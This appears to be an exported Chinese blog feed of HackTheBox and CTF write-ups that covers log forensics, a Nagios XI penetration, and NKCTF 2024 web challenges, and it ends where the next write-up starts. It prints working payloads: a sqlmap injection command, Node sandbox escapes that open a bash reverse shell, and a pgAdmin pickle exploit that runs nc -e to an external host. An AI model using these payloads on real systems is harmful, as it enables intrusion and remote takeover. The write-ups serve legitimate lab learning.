<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>请提供攻击者用于在我们的主机上获得持久性的公钥的文件名。</strong></p>
<p>我们已经知道黑客用wget去下载该文件，我们打开kali去下载看看</p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418202654452.png"></p>
<p>不给连接这就怪了，文件内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>

<p>所以文件名为<code>hffgra4unv</code></p>
<h2 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h2><p><strong>您能否确认攻击者修改的文件以获得持久性？</strong></p>
<p>通过前一道题可以知道用curl命令将文件写到<code>/home/ubuntu/.ssh/authorized_keys</code></p>
<p>所以能知道攻击者修改了文件</p>
<h2 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h2><p><strong>您能确认这种持久性机制的 MITRE 技术 ID 吗？</strong></p>
<p>搜索引擎搜索<code>MITRE authorized_keys</code> ，成功找到id为<code>T1098.004</code></p>
<p><img src="/article/Meerkat-HackTheBox/image-20240418203318734.png"></p>
]]></content>
      <categories>
        <category>流量分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>Logjammer</title>
    <url>/article/Logjammer-HackTheBox.html</url>
    <content><![CDATA[<p>多个Windows日志文件进行分析，不同的操作被记录在不同的日志并且对应的事件ID很重要，极大方便我们审计日志</p>
<span id="more"></span>



<h1 id="Logjammer"><a href="#Logjammer" class="headerlink" title="Logjammer"></a>Logjammer</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
<p>您有机会在一家大型咨询公司担任初级 DFIR 顾问。但是，他们提供了技术评估供您完成。咨询公司 Forela-Security 希望评估您对 Windows 事件日志分析的了解。请分析并报告他们提出的问题。</p>
</blockquote>
<h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>用户 cyberjunkie 何时成功登录他的计算机？ （世界标准时间）</strong></p>
<p>题目附件有五个，其中记录Windows登录的日志文件为<code>Security.evtx</code></p>
<p>我们进行搜索找到cyberjunkie登录的时间，转换一下为<code>27/03/2023 14:37:09</code></p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422170139500.png"></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>用户篡改了系统上的防火墙设置。分析防火墙事件日志以找出添加的防火墙规则的名称？</strong></p>
<p>我们切换到<code>Windows Firewall-Firewall.evtx</code>日志文件，初步发现事件2004是修改&#x2F;添加规则的</p>
<p>那么我们在Windows系统下，使用工具EvtxeCmd将其转换成json格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./EvtxeCmd.exe -f D:\网安工具\取证\附件\Windows-Firewall-Firewall.evtx --json D:\网安工具\取证\附件</span><br></pre></td></tr></table></figure>

<p>然后使用jq命令筛选事件2004和查询PayloadData1字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 20240422094340_EvtxECmd_Output.json | D:\网安工具\取证\jq-1.7.1\jq -c &#x27;select(.EventId == 2004)&#x27; | D:\网安工具\取证\jq-1.7.1\jq -s &#x27;.[0] | [.PayloadData1]&#x27;</span><br></pre></td></tr></table></figure>

<p>得到添加的规则为<code>Metasploit C2 Bypass</code></p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422194553198.png"></p>
<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>防火墙规则的方向是什么？</strong></p>
<p>很明显是出站，英文就是outbound</p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422195244130.png"></p>
<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p><strong>用户更改了计算机的审计策略。这个更改策略的子类是什么？</strong></p>
<p>审计策略更改的日志 ID 为 <code>4719</code></p>
<p>子类为<code>Other Object Access Events</code></p>
<h2 id="Task5"><a href="#Task5" class="headerlink" title="Task5"></a>Task5</h2><p><strong>用户“cyberjunkie”创建了一个计划任务。这个任务的名字是什么？</strong></p>
<blockquote>
<p>在 Windows 操作系统中，创建计划任务的事件将被记录在 Windows 安全事件日志（Security Event Log）中，并使用事件 ID 4698</p>
</blockquote>
<p>直接筛选事件为4698，任务名为<code>HTB-AUTOMATION</code></p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422200633789.png"></p>
<h2 id="Task6"><a href="#Task6" class="headerlink" title="Task6"></a>Task6</h2><p><strong>为任务安排的文件的完整路径是什么？</strong></p>
<p>在前一题的TaskContent找到路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Desktop\Automation-HTB.ps1</span><br></pre></td></tr></table></figure>



<h2 id="Task7"><a href="#Task7" class="headerlink" title="Task7"></a>Task7</h2><p><strong>该命令的参数是什么？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A cyberjunkie@hackthebox.eu</span><br></pre></td></tr></table></figure>

<p><img src="/article/Logjammer-HackTheBox/image-20240422200911551.png"></p>
<h2 id="Task8"><a href="#Task8" class="headerlink" title="Task8"></a>Task8</h2><p><strong>系统上运行的防病毒软件识别出威胁并对其执行操作。哪个工具被防病毒软件识别为恶意软件？</strong></p>
<p>该操作是在<code>Windows Defender</code>日志文件下记录的，并且对应ID为1117、1003、1004、1116等</p>
<p>所以我们直接锁定到事件1117，发现恶意软件被警告</p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422201354285.png"></p>
<h2 id="Task9"><a href="#Task9" class="headerlink" title="Task9"></a>Task9</h2><p><strong>引发警报的恶意软件的完整路径是什么？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\CyberJunkie\Downloads\SharpHound-v1.1.0.zip</span><br></pre></td></tr></table></figure>

<h2 id="Task10"><a href="#Task10" class="headerlink" title="Task10"></a>Task10</h2><p><strong>防病毒软件采取了什么行动？</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Quarantine  //隔离</span><br></pre></td></tr></table></figure>

<p><img src="/article/Logjammer-HackTheBox/image-20240422201658602.png"></p>
<h2 id="Task11"><a href="#Task11" class="headerlink" title="Task11"></a>Task11</h2><p><strong>用户使用Powershell执行命令。用户执行了什么命令？</strong></p>
<blockquote>
<p>一般情况下，用户在 PowerShell 中执行命令所生成的事件记录在 Windows 安全事件日志（Security Event Log）中的事件 ID 4104。</p>
</blockquote>
<p>直接切换到<code>Powershell-Operational</code>日志文件，然后筛选事件4104，找到执行的命令</p>
<p><img src="/article/Logjammer-HackTheBox/image-20240422202108317.png"></p>
<h2 id="Task12"><a href="#Task12" class="headerlink" title="Task12"></a>Task12</h2><p><strong>我们怀疑用户删除了一些事件日志。哪个事件日志文件被清除？</strong></p>
<p>切换到System日志文件，找到被删除的日志文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft-Windows-Windows Firewall With Advanced Security/Firewall</span><br></pre></td></tr></table></figure>

<p><img src="/article/Logjammer-HackTheBox/image-20240422202827593.png"></p>
]]></content>
      <categories>
        <category>日志分析</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Monitored</title>
    <url>/article/Monitored-HackTheBox.html</url>
    <content><![CDATA[<p>snmp协议</p>
<span id="more"></span>

<h1 id="Monitored"><a href="#Monitored" class="headerlink" title="Monitored"></a>Monitored</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.248</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">84/tcp   filtered ctf</span><br><span class="line">389/tcp  open     ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open     ssl/http Apache httpd 2.4.56 ((Debian))</span><br></pre></td></tr></table></figure>

<p>注意到80端口跳转到<code>https://nagios.monitored.htb/</code>且无法访问，我们试试添加到<code>/etc/hosts</code>成功访问</p>
<p>继续访问发现是登陆界面</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403182522547.png"></p>
<p>然后就没有什么收获了，参考国外师傅wp是要进行 udp 扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sC -v -sU 10.10.11.248</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE         SERVICE  VERSION</span><br><span class="line">68/udp  open|filtered dhcpc</span><br><span class="line">123/udp open          ntp      NTP v4 (unsynchronized)</span><br><span class="line">161/udp open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp open|filtered snmptrap</span><br></pre></td></tr></table></figure>

<p>注意到161端口为snmp协议，我们先简单了解下两个概念</p>
<p><strong>SNMP</strong></p>
<blockquote>
<p>SNMP是一种标准的网络管理协议，它允许管理员监控和管理网络设备，例如路由器、交换机、服务器等。它有三个版本分别是<code>1，c2，3</code>，主要区别在于操作类型和安全性。</p>
</blockquote>
<p><strong>管理信息库MIB</strong></p>
<blockquote>
<p>任何一个被管理的资源都表示成一个对象，称为被管理的对象。MIB是被管理对象的集合。它定义了被管理对象的一系列属性：对象的名称、对象的访问权限和对象的数据类型等。</p>
</blockquote>
<p>MIB文件中的变量使用的名字取自ISO和ITU管理的对象标识符（object identifier）名字空间。它是一种分级树的结构。如下图所示，第一级有三个节点：ccitt、iso、iso-ccitt。低级的对象ID分别由相关组织分配。一个特定对象的标识符可通过由根到该对象的路径获得，一般网络设备取iso节点下的对象内容。</p>
<p>如名字空间ip结点下一个名字为ipInReceives的MIB变量被指派数字值3，那么该变量名为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iso.org.dod.internet.mgmt.mib.ip.ipInReceives</span><br></pre></td></tr></table></figure>

<p>相应的数字表示（对象标识符OID，唯一标识一个MIB对象）为<code>1.3.6.1.2.1.4.3</code></p>
<p><img src="/article/Monitored-HackTheBox/image-20240403192944296.png"></p>
<p>回到题目，用snmpwalk进行扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 10.10.11.248 1.3.6.1.2.1.25</span><br></pre></td></tr></table></figure>

<p>注：这里版本应该都能扫出来</p>
<p>​		<code>public</code>为团体名，是一种简单的身份验证机制</p>
<p>​		<code>1.3.6.1.2.1.25</code>为对象标识符OID(收集所有系统信息)</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403194127846.png"></p>
<p>得到用户登录信息<code>svc:XjH7VCehowpR1xZB</code></p>
<p><img src="/article/Monitored-HackTheBox/image-20240403193352038.png"></p>
<p>不过登陆失败</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403194504872.png"></p>
<p>我们扫一下目录发现路径<code>/nagios</code>，访问一下有登录框</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403200058890.png"></p>
<p>成功登录</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403200301691.png"></p>
<p>获得信息Nagios xi版本为4.4.13，找到相关漏洞</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403202017508.png"></p>
<p>我们可以用sqlmap去注入数据库得到admin的api信息 <a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">参考文章</a></p>
<p>当然在文章中我们注意到成功需要知道cookie值</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403202147750.png"></p>
<p>我们通过对<code>/nagiosxi</code>不断深度扫描，最终得到下面路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br></pre></td></tr></table></figure>

<p><img src="/article/Monitored-HackTheBox/image-20240403202956326.png"></p>
<p>我们bp抓包修改下请求方式，提交参数为刚刚的用户和密码</p>
<p>得到token值<code>a7eb754b64862d9a0943c405c4d4e2717eea9d51</code></p>
<p><img src="/article/Monitored-HackTheBox/image-20240403203751456.png"></p>
<p>因为这里的token值会变，所以在使用sqlmap的时候用curl命令去获得</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ks https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;`&quot; --level 5 --risk 3 -p id --batch --dbs</span><br></pre></td></tr></table></figure>

<p>得到admin的api后，添加用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=rev1ve&amp;password=rev1ve&amp;name=rev1ve&amp;email=rev1ve@localhost&amp;auth_level=admin&quot;</span><br></pre></td></tr></table></figure>

<p>我们成功用<code>rev1ve:rev1ve</code>登录</p>
<p><img src="/article/Monitored-HackTheBox/image-20240403235458293.png"></p>
<p>然后<code>Configure -&gt; Core Config Manager</code>找到Command，添加反弹shell命令</p>
<p>然后在<code>Monitoring-&gt;Hosts-&gt;localhost</code>中Run一下调用shell</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404000803329.png"></p>
<p>成功反弹shell</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404000838169.png"></p>
<p>得到user的flag</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404000948674.png"></p>
<p>尝试sudo提权</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404001440760.png"></p>
<p>试试<code>manage_services.sh</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh</span><br></pre></td></tr></table></figure>

<p>执行后提示需要有参数，随便加一个status</p>
<p><img src="/article/Monitored-HackTheBox/image-20240404003341695.png"></p>
<p><code>manage_services.sh</code>可以控制服务，注意到npcd文件可控，并且能够以root用户执行npcd服务的开启和关闭，因此可以在npcd服务中加入一段反弹shell来提权</p>
<p>我们先停止npcd服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Monitored-HackTheBox/image-20240404003853008.png"></p>
<p>使用wget命令下载我们的npcd文件，赋予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x npcd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Monitored-HackTheBox/image-20240404002218837.png"></p>
<p>然后开启<code>npcd</code>服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</span><br></pre></td></tr></table></figure>

<p>成功提权拿到root的flag</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>NKCTF 2024</title>
    <url>/article/NKCTF2024web%E8%A7%A3%E6%9E%90.html</url>
    <content><![CDATA[<p>CVE-2019-9059、沙箱逃逸、CVE-2024-2044</p>
<span id="more"></span>

<h1 id="NKCTF-2024"><a href="#NKCTF-2024" class="headerlink" title="NKCTF 2024"></a>NKCTF 2024</h1><h2 id="my-first-cms"><a href="#my-first-cms" class="headerlink" title="my first cms"></a>my first cms</h2><p>打开题目在最下面发现是CMS Made Simple，版本为2.2.19</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093023723.png"></p>
<p>扫一下发现存在后台登陆界面，直接访问</p>
<p>用字典爆破下admin的密码为Admin123</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093321830.png"></p>
<p>然后直接登录，去漏洞库搜一下其实存在很多漏洞（重点看最近的）</p>
<p>找到CMS Made Simple的RCE漏洞（CVE-2019-9059）<a href="https://www.exploit-db.com/exploits/49345">参考文章</a></p>
<p>步骤如下</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325093554457.png"></p>
<p>登陆后按照上图，保存后去执行代码</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092708716.png"></p>
<p>成功反弹shell，得到flag</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325092809851.png"></p>
<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p>扫目录发现存在<code>/secret</code>源码泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const bodyParser = require(&#x27;body-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">const fs = require(&quot;fs&quot;);</span><br><span class="line">const path = require(&#x27;path&#x27;);</span><br><span class="line">const vm = require(&quot;vm&quot;);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.use(bodyParser.json())</span><br><span class="line">.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;))</span><br><span class="line">.use(express.static(path.join(__dirname, &#x27;/public&#x27;)))</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">    res.sendFile(__dirname + &#x27;/public/home.html&#x27;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function waf(code) &#123;</span><br><span class="line">    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;</span><br><span class="line">    if(code.match(pattern))&#123;</span><br><span class="line">        throw new Error(&quot;what can I say? hacker out!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/&#x27;, function (req, res)&#123;</span><br><span class="line">        let code = req.body.code;</span><br><span class="line">        let sandbox = Object.create(null);</span><br><span class="line">        let context = vm.createContext(sandbox);</span><br><span class="line">        try &#123;</span><br><span class="line">            waf(code)</span><br><span class="line">            let result = vm.runInContext(code, context);</span><br><span class="line">            console.log(result);</span><br><span class="line">        &#125; catch (e)&#123;</span><br><span class="line">            console.log(e.message);</span><br><span class="line">            require(&#x27;./hack&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(3000, ()=&gt;&#123;</span><br><span class="line">    console.log(&quot;listen on 3000&quot;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>本题是考察如何沙箱逃逸实现RCE，waf过滤很多，process被办意味着我们需要用别的手段去得到process对象，中括号被办就不能利用js特性拼接绕过，<code>\</code>被办意味着不能十六进制或者Unicode绕过。</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p><a href="https://ycznkvrmzo.feishu.cn/docx/E92JdQmGxoUwXexnQgpcRaIsn7g">参考LaoGong战队</a></p>
<p>我们注意到源码中的沙箱定义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let code = req.body.code;</span><br><span class="line">let sandbox = Object.create(null);</span><br><span class="line">let context = vm.createContext(sandbox);</span><br></pre></td></tr></table></figure>

<p>create内为null，并且也没有其他可以引用的对象，这时候想要逃逸我们要用到一个函数中的内置对象的属性arguments.callee.caller，它可以返回函数的调用者。</p>
<p>而一般情况如果没有执行字符串操作或者利用函数重写，我们可以利用Proxy劫持</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span><br><span class="line">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>而本题过滤了很多，我们可以用replace函数来绕过对process的检测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const p = (cc.constructor.constructor(&#x27;return proAcess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">const obj=p.mainModule.require(&#x27;child_process&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br></pre></td></tr></table></figure>

<p>接下来是最为精彩的一步，利用javascript内置函数去返回一个属性描述符（PropertyDescriptor）对象，其中包括value也就是属性值</p>
<p>最终payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">        get: function()&#123;</span><br><span class="line">            const cc = arguments.callee.caller;</span><br><span class="line">            const p = (cc.constructor.constructor(&#x27;return procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;)))();</span><br><span class="line">			const obj = p.mainModule.require(&#x27;child_procAess&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			const ex = Object.getOwnPropertyDescriptor(obj,&#x27;exeAcSync&#x27;.replace(&#x27;A&#x27;,&#x27;&#x27;));</span><br><span class="line">			return ex.value(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&quot;&#x27;).toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>成功反弹shell，执行<code>/readflag</code>得到flag</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325213907880.png"></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p><a href="https://c1oudfl0w0.github.io/blog/2024/03/23/NKCTF2024/">参考文章</a></p>
<p>我们注意下面代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.get(&#x27;/secret&#x27;, function (req, res)&#123;</span><br><span class="line">    if(process.__filename == null) &#123;</span><br><span class="line">        let content = fs.readFileSync(__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        let content = fs.readFileSync(process.__filename, &quot;utf-8&quot;);</span><br><span class="line">        return res.send(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>如果<code>process.__filename</code>为null则回显源码，我们可以利用原型链污染<code>__filename</code>实现任意文件读取</p>
<p>本解法利用反射去得到process对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))()</span><br><span class="line">        return p.__filename=&quot;/etc/passwd&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>然后访问 &#x2F;secret 即可成功读取</p>
<p>尝试读&#x2F;flag，返回permission denied, open ‘&#x2F;flag’，没权限直接读</p>
<p>尝试读<code>./hack</code>，注意路径是<code>/app/hack.js</code>，提示<code>shell.js</code>跟进一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(&quot;shell&quot;); const p = require(&#x27;child_process&#x27;); p.execSync(process.env.command);</span><br></pre></td></tr></table></figure>

<p>最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw new Proxy(&#123;&#125;, &#123;</span><br><span class="line">    get: function()&#123;</span><br><span class="line">        const c = arguments.callee.caller;</span><br><span class="line">        const p = (c.constructor.constructor(&quot;return Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes(&#x27;pro&#x27;)))&quot;))();</span><br><span class="line">        p.env.command=&quot;whoami&quot;;</span><br><span class="line">        return p.mainModule.require(&quot;./shell&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a>attack_tacooooo</h2><blockquote>
<p>pgAdmin CVE-2024-2044</p>
</blockquote>
<p>猜测出用户和密码<code>tacooooo@qq.com tacooooo</code></p>
<p>登陆后发现是pgAdmin 4，搜索一番发现有个很新的漏洞 <a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">参考文章</a></p>
<p>poc.py如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def produce_pickle_bytes(platform, cmd):</span><br><span class="line">    b = b&#x27;\x80\x04\x95&#x27;</span><br><span class="line">    b += struct.pack(&#x27;L&#x27;, 22 + len(platform) + len(cmd))</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(platform)) + platform.encode()</span><br><span class="line">    b += b&#x27;\x94\x8c\x06system\x94\x93\x94&#x27;</span><br><span class="line">    b += b&#x27;\x8c&#x27; + struct.pack(&#x27;b&#x27;, len(cmd)) + cmd.encode()</span><br><span class="line">    b += b&#x27;\x94\x85\x94R\x94.&#x27;</span><br><span class="line">    print(b)</span><br><span class="line">    return b</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # if len(sys.argv) != 2:</span><br><span class="line">    #     exit(f&quot;usage: &#123;sys.argv[0]&#125; ip:port&quot;)</span><br><span class="line">    # with open(&#x27;nt.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    #     f.write(produce_pickle_bytes(&#x27;nt&#x27;, f&quot;nc 115.236.153.172 41678 -e /bin/sh&quot;))</span><br><span class="line">    with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">        f.write(produce_pickle_bytes(&#x27;posix&#x27;, f&quot;nc 5i781963p2.yicp.fun 58265 -e /bin/sh&quot;))</span><br></pre></td></tr></table></figure>

<p>直接<code>python3 poc.py</code>生成pickle文件（这里kali不行，用了其他师傅的Ubuntu生成的）</p>
<p>上传成功后，修改cookie为<code>pga4_session=/var/lib/pgadmin/storage/tacooooo_qq.com/posix.pickle!a</code></p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240325235724144.png"></p>
<p>然后成功反弹shell，在<code>proc/1/environ</code>找到flag</p>
<p><img src="/article/NKCTF2024web%E8%A7%A3%E6%9E%90/image-20240326001639956.png"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>CMS</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSRound#18 Basic</title>
    <url>/article/NSSRound-18-Basic.html</url>
    <content><![CDATA[<p>session伪造、perl_startup提权</p>
<span id="more"></span>

<h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>打开题目，加载完视频后要求我们给个游戏链接</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151412487.png"></p>
<p>点开评论区不难发现应该是想玩元梦之星，这里有个评论功能可以上传图片</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151551692.png"></p>
<p>我们随便输入点东西发现是插入并赋值到content元素里面</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314151833094.png"></p>
<p>猜测是存储型xss，我们去看看hint访问下<code>/nssctfroundSpring.php</code></p>
